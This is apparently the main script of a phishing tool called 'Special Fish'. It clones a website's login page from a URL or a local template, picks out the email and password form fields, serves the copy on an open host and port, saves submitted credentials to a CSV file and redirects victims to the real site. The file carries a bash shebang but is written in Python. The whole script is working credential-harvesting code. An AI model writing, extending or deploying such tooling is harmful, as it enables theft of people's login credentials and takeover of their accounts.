#!/bin/bash
from sys import argv
from re import search

from src.output import autosave
from src.server import Serve
from src.process import StripeInputs
from src import webpage as wp
from src.help import help

class main:
    host = "0.0.0.0"
    port = 8080
    out = "csv"
    url = ""
    redirect = ""


print("-= Special Fish =-")

if len(argv) < 2:
    help("")
    exit(0)

if argv[1] == "-h" or argv[1] == "--help":
    try:
        help(argv[2])
    except IndexError:
        help("")
        help("--list-commands")
else:
    for a in argv:
        if search("--import-template=", a):
            url = a.replace("--import-template=", "")
            main.url = url
            wp.autoimport(url)
            
        if search("--local-template=", a):
            template = a.replace("--local-template=", "")
            wp.WriteHtml(wp.ChangeHtml(wp.OpenHtml()))
        
        if search("--redirect=", a):
            main.redirect = a.replace("--redirect=", "")
            if main.redirect == "":
                main.redirect = main.url

        if search("--webserver-port=", a):
            main.port = a.replace("--webserver-port=", "")
        
        if search("--webserver-host=", a):
            main.host = a.replace("--webserver-host=", "")

        if search("--output=", a):
            main.out = a.replace("--output=", "")

    # server
    Serve(host=main.host, port=main.port ,email_form=StripeInputs()["email"], password_form=StripeInputs()["pwd"], rd=main.redirect, dic={"func":autosave, "res":main.out})